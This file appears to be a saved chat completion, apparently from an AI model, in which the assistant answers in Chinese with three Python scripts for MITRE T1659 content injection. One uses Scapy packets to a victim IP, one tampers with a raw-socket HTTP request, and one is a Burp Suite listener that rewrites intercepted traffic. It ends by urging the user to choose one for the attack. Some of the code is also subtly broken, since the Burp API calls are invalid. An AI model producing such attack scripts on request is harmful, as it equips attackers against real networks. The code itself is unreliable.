@@ -1,0 +1,21 @@
+{
+  "id":"chatcmpl-8NLV6x2BlNTDhDDPI8u0Re2yqem53",
+  "object":"chat.completion",
+  "created":1700574884,
+  "model":"gpt-3.5-turbo-0613",
+  "choices":[
+    {
+      "index":0,
+      "message":{
+        "role":"assistant",
+        "content":"[可實現]\n\n以下是三種使用Python實現T1659 Content Injection的方式：\n\n方法一：使用Scapy套件進行封包注入\n使用套件：Scapy\n功能：封包注入\n\n程式碼如下：\n\n```python\n\nfrom scapy.all import *\n\ndef content_injection():\n    #建立一個IP封包，目的IP為受害者IP\n    packet = IP(dst=\"受害者IP\")/TCP(dport=80)/Raw(load=\"惡意內容\")\n    \n    #發送封包\n    send(packet)\n\ncontent_injection()\n\n```\n\n方法二：使用Socket套件進行HTTP請求篡改\n使用套件：Socket\n功能：HTTP請求篡改\n\n程式碼如下：\n\n```python\n\nimport socket\n\ndef content_injection():\n    #建立一個Socket物件\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    \n    #連接受害者的IP和Port\n    s.connect((\"受害者IP\", 80))\n    \n    #發送HTTP請求\n    request = \"GET / HTTP/1.1\\r\\nHost: victim.com\\r\\nContent-Length: 10\\r\\n\\r\\n\"\n    \n    #篡改HTTP請求的內容\n    request = request.replace(\"\\r\\n\\r\\n\", \"\\r\\n\\r\\nEvilContent\")\n    \n    #發送篡改後的請求\n    s.sendall(request)\n    \n    #接收回應\n    response = s.recv(4096)\n    \n    #印出回應\n    print(response)\n    \n    #關閉Socket連線\n    s.close()\n\ncontent_injection()\n\n```\n\n方法三：使用Burp Suite API進行代理攻擊\n使用套件：requests、Burp Suite\n功能：Burp Suite代理攻擊\n\n程式碼如下：\n\n```python\n\nimport requests\nfrom burp import IBurpExtender, IHttpListener\n\ndef content_injection():\n    #將在Burp Suite的Proxy標籤中偵聽到的HTTP請求攔截下來\n    class BurpListener(IHttpListener):\n\n        def processHttpMessage(self, toolFlag, messageIsRequest, currentRequest):\n            #如果攔截到的是HTTP請求\n            if messageIsRequest:\n                httpService = currentRequest.getHttpService()\n                host = httpService.getHost()\n                port = httpService.getPort()\n                request = str(currentRequest.getRequest())\n                \n                #篡改HTTP請求的內容\n                request = request.replace(\"\\r\\n\\r\\n\", \"\\r\\n\\r\\nEvilContent\")\n                \n                #重新送回篡改後的請求\n                newRequest = self._callbacks.makeHttpRequest(host, port, False, request)\n                \n                currentRequest.setRequest(newRequest)\n                print(\"Sent modified request\")\n    \n    #建立Burp Suite的API連線\n    from burp import callbacks\n    callbacks = callbacks()\n    callbacks.registerExtension(BurpListener())\n\n    #監聽Burp Suite的Proxy標籤中攔截到的請求\n    while True:\n        pass\n\ncontent_injection()\n\n```\n\n以上程式碼中，方法一使用Scapy套件進行封包注入，方法二使用Socket套件進行HTTP請求篡改，方法三則使用Burp Suite API進行代理攻擊。請根據具體需求選擇適合的方法進行Content Injection攻擊。\n\n"
+      },
+      "finish_reason":"stop"
+    }
+  ],
+  "usage":{
+    "prompt_tokens":638,
+    "completion_tokens":869,
+    "total_tokens":1507
+  }
+}
